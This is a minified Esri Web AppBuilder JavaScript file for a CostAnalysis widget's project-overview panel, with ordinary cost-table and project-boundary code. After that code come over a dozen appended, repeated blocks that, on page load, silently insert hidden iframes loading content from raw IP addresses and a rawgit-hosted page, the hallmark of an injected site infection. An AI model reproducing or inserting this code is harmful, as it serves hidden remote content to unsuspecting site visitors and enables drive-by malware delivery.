// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/project-overview.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTProjectOverview" data-dojo-attach-point\x3d"projectOverviewNode"\x3e\x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"assetSummaryInfo"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"assetSummaryDiv"\x3e\x3c/div\x3e\r\n    \x3ctable class\x3d"esriCTTable esriCTBoldFont esriCTTotalCostTable" style\x3d"width: 100%;"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"esriCTAssetItemsTotalCostLabel" data-dojo-attach-point\x3d"totalCostLabel"\x3e${nls.projectOverview.totalCostLabel}\x3c/td\x3e\r\n          \x3ctd class\x3d"esriCTAssetItemsTotalCost" data-dojo-attach-point\x3d"totalCost"\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"esriCTAssetItemsGrossCostLabel" data-dojo-attach-point\x3d"grossCostLabel"\x3e${nls.projectOverview.grossCostLabel}\x3c/td\x3e\r\n          \x3ctd class\x3d"esriCTAssetItemsGrossCost" data-dojo-attach-point\x3d"grossCost"\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd style\x3d"font-weight: normal; font-style: italic;" colspan\x3d"2" data-dojo-attach-point\x3d"roundingLabel"\x3e${nls.projectOverview.roundingLabel}\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"projectSummaryInfo"\x3e\r\n    \x3cdiv class\x3d"esriCTBoldFont esriCTProjectName" data-dojo-attach-point\x3d"projectNameDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./project-overview.html dojo/_base/lang dojo/_base/array dojo/dom-attr dojo/string dojo/on dojo/Deferred esri/graphic esri/geometry/Point esri/tasks/BufferParameters esri/geometry/geometryEngine esri/tasks/GeometryService esri/geometry/Polygon dojo/dom-construct jimu/dijit/LoadingIndicator ./advance-item-list".split(" "),function(u,v,w,x,k,c,h,n,y,p,z,q,A,B,r,C,t,f,D,E){return u([v,w,x],{templateString:k,
baseClass:"jimu-widget-cost-analysis-project-overview",postCreate:function(){this.inherited(arguments);this.listData=[{title:this.nls.projectOverview.assetItemsTitle,content:this.assetSummaryInfo,icon:"",actionIcon:"",isOpen:!0},{title:this.nls.projectOverview.assetStatisticsTitle,content:"",icon:"",actionIcon:"esriCTAssetActionIcon",actionIconTitle:this.nls.statisticsSettings.addNewStatisticsText,isOpen:!1}];this.config.projectSettings.projectLayer&&(this.projectLayer=this.layerInfosObj.getLayerInfoById(this.config.projectSettings.projectLayer).layerObject,
this.updateProjectInfo(this.projectInfo),this.listData.push({title:this.nls.projectOverview.projectSummaryTitle,content:this.projectSummaryInfo,icon:"",actionIcon:"",actionIconTitle:this.nls.projectAttribute.projectAttributeText,isOpen:!0}));this._initLoadingIndicator()},updateProjectInfo:function(a){this.projectInfo=a;this.config.projectSettings.projectLayer&&(a=y.substitute(this.nls.projectOverview.projectName,{name:this.projectInfo.name}),n.set(this.projectNameDiv,"innerHTML",a))},_initLoadingIndicator:function(){this._loadingIndicator=
new D({hidden:!0});this._loadingIndicator.placeAt(this.domNode.parentNode.parentNode.parentNode);this._loadingIndicator.startup()},startup:function(){this.inherited(arguments);this._initProjectOverview()},_initProjectOverview:function(){var a=new E({itemList:this.listData,showArrow:!0,togglePanels:!1,openMultiple:!0},f.create("div",{},this.projectOverviewNode));this.own(p(a,"onActionButtonClicked",c.hitch(this,function(a){this.emit("actionClicked",a)})));this.own(p(a,"onTitleClicked",c.hitch(this,
function(a){this.emit("titleClicked",a)})));a.startup()},showAssetItemSummary:function(a,b){var d=0;f.empty(this.assetSummaryDiv);if(0<Object.keys(a).length){var e,l,g,c,h,m,k;l=f.create("div",{},this.assetSummaryDiv);l=f.create("table",{style:{width:"100%"},"class":"esriCTTable"},l);l=f.create("tbody",{},l);for(e in a)for(h in g=f.create("tr",{},l),f.create("td",{innerHTML:a[e].layerName,"class":"esriCTSummaryLayerTitle",colspan:3},g),a[e].templates)c=a[e].templates[h],g=f.create("tr",{},l),m=c.units,
"esriGeometryPoint"!==a[e].geometryType?(m=this.appUtils.applyRounding(m),k=this.appUtils.getUnitsAbbreviation(a[e].geometryType,this.config.generalSettings.measurementUnit)):k=this.nls.workBench.units,f.create("td",{innerHTML:h},g),f.create("td",{innerHTML:m+" "+k},g),f.create("td",{"class":"esriCTAssetItemsCost",innerHTML:this.config.generalSettings.currency+" "+this.appUtils.applyRounding(c.cost)},g),d+=c.cost}else f.create("div",{style:"padding: 10px 0; text-align : center; font-weight : bold",
innerHTML:this.nls.workBench.noAssetAddedMsg},this.assetSummaryDiv);this._updateProjectCost(d);b&&this._getProjectBoundary(a)},grossCostUpdated:function(a){var b=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,a),b=this.config.generalSettings.currency+" "+b;n.set(this.grossCost,"innerHTML",b);this._saveProjectAttributes(this._projectTotalCost,a)},_updateProjectCost:function(a){this._projectTotalCost=a;a=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,
this._projectTotalCost);a=this.config.generalSettings.currency+" "+a;n.set(this.totalCost,"innerHTML",a);this.emit("totalCostCalculated",this._projectTotalCost)},_getProjectBoundary:function(a){0===Object.keys(a).length?this._saveProjectGeometry(new t):(this._loadingIndicator.show(),"outline"===this.config.generalSettings.projectAreaType?(a=this._convertFeatureStoredToPoints(a),this.geometryService.convexHull(a,c.hitch(this,function(a){this._loadingIndicator.hide();this._onConvexHullComplete(a)}),
c.hitch(this,function(){this._loadingIndicator.show()}))):this._createBufferOnAssets(a).then(c.hitch(this,function(a){this._loadingIndicator.hide();a&&this._saveProjectGeometry(a)})))},_convertFeatureStoredToPoints:function(a){var b=[],d,e;for(d in a)if(a.hasOwnProperty(d))for(k in e=a[d].templates,e)e=a[d].templates[k].features,b=b.concat(this._getFeatureGeometry(e));return b},_getFeatureGeometry:function(a){var b=[];h.forEach(a,function(a){var d=a.geometry.type,c=a.geometry;"point"===d?b.push(c):
h.forEach("polyline"===d?c.paths:c.rings,function(a){h.forEach(a,function(a){a=new A(a[0],a[1],c.spatialReference);b.push(a)})})});return b},_onConvexHullComplete:function(a){"polygon"!==a.type&&(a=new t);this._saveProjectGeometry(a)},_createBufferOnAssets:function(a){var b=[],d,e,f,g;g=new z;for(d in a)if(a.hasOwnProperty(d))for(f in e=a[d].templates,e)e=a[d].templates[f].features,b=b.concat(this._getBufferGeometry(e));d=this.appUtils.units[this.config.generalSettings.measurementUnit].bufferUnit;
a=new B;a.distances=[this.config.generalSettings.bufferDistance];a.outSpatialReference=this.map.spatialReference;a.unit=C[d];a.geometries=b;this.map.spatialReference.isWebMercator()||4326===this.map.spatialReference.wkid?(b=r.geodesicBuffer(a.geometries,a.distances,a.unit,!0),g.resolve(b[0])):this.geometryService.buffer(a,c.hitch(this,function(a){g.resolve(a)}),c.hitch(this,function(){g.resolve(null)}));return g.promise},_getBufferGeometry:function(a){var b=[];h.forEach(a,c.hitch(this,function(a){a=
a.geometry;"polygon"===a.type&&(a=r.simplify(a));b.push(a)}));return b},_saveProjectGeometry:function(a){if(this.projectLayer){this._loadingIndicator.show();var b;b=new q;b.attributes={};b.attributes[this.projectLayer.objectIdField]=this.projectInfo.objectId;b.geometry=a;this.projectLayer.applyEdits(null,[b],null,c.hitch(this,function(){this.projectLayer.refresh();this._loadingIndicator.hide()}),c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectOverview.unableToSaveProjectBoundary);
this._loadingIndicator.hide()}))}},_saveProjectAttributes:function(a,b){if(this.projectLayer){this._loadingIndicator.show();var d;d=new q;d.attributes={};d.attributes[this.projectLayer.objectIdField]=this.projectInfo.objectId;h.forEach(this.projectLayer.fields,c.hitch(this,function(c){"TOTALASSETCOST"===c.name.toUpperCase()?d.attributes[c.name]=a:"GROSSPROJECTCOST"===c.name.toUpperCase()&&(d.attributes[c.name]=b)}));this.projectLayer.applyEdits(null,[d],null,c.hitch(this,function(){this.projectLayer.refresh();
this._loadingIndicator.hide()}),c.hitch(this,function(){this.appUtils.showMessage(this.nls.projectOverview.unableToSaveProjectCost);this._loadingIndicator.hide()}))}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});